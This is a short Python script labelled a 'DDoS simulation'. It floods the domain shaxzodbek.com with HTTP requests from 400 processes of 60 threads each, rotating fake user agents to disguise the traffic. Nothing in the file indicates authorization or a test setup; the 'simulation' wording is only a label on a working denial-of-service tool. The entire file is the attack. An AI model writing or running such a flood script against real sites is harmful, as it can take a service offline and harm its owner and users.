import requests
import threading
import multiprocessing
import random
import time

from fake_useragent import UserAgent

URL = "https://shaxzodbek.com"
THREAD_COUNT = 60
SIMULATION_DURATION = 30  # seconds


def attack(thread_id, stop_time):
    ua = UserAgent()  # Local instance for process/thread safety
    while time.time() < stop_time:
        try:
            headers = {"User-Agent": ua.random}
            response = requests.get(URL, headers=headers, timeout=3)
            print(
                f"Thread {thread_id} sent request, status code: {response.status_code}"
            )
        except requests.exceptions.RequestException as e:
            print(f"Thread {thread_id} encountered an error: {e}")
        time.sleep(random.uniform(0.1, 0.5))


def run_ddos_simulation():
    print(
        f"Starting DDoS simulation with {THREAD_COUNT} threads for {SIMULATION_DURATION} seconds..."
    )
    stop_time = time.time() + SIMULATION_DURATION
    threads = []

    for i in range(THREAD_COUNT):
        t = threading.Thread(target=attack, args=(i, stop_time))
        t.daemon = True
        t.start()
        threads.append(t)

    time.sleep(SIMULATION_DURATION)
    print("Simulation completed in one process.")


def main():
    print("DDoS simulation script using multiprocessing + multithreading.")
    processes = []

    for i in range(400):
        p = multiprocessing.Process(target=run_ddos_simulation)
        p.start()
        processes.append(p)

    # Wait for all processes to finish
    for p in processes:
        p.join()

    print("All processes completed.")


if __name__ == "__main__":
    main()
